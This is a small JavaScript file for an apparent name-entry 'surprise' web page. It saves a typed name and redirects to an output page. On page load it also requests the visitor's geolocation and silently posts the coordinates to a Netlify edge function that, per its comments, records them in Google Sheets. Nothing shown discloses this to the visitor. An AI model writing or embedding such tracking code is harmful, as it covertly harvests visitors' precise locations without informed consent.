const text = document.querySelector("#main");
const btn = document.querySelector(".btn");
const change = document.querySelector(".here");

btn.addEventListener("click", function () {
    const name = text.value;
    sessionStorage.setItem("userName", name);
    window.location.href = "output.html";
});

// This function will be triggered when the page is loaded
window.addEventListener('load', async () => {
  try {
    // Capture the user's geolocation (latitude and longitude)
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(async (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        console.log('User Latitude:', latitude);
        console.log('User Longitude:', longitude);

        // Send the captured location to the Edge Function hosted on your Netlify site
        const response = await fetch('https://surprise-yourself.netlify.app/.netlify/edge-functions/loc', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ latitude, longitude }),
        });

        // Check if the request was successful
        if (response.ok) {
          const data = await response.json();
          console.log('Location sent to Google Sheets:', data);
        } else {
          console.error('Error sending location to Google Sheets');
        }
      }, (error) => {
        console.error('Error getting geolocation:', error);
      });
    } else {
      console.log('Geolocation is not supported by this browser.');
    }
  } catch (error) {
    console.error('Error fetching the Edge Function:', error);
  }
});

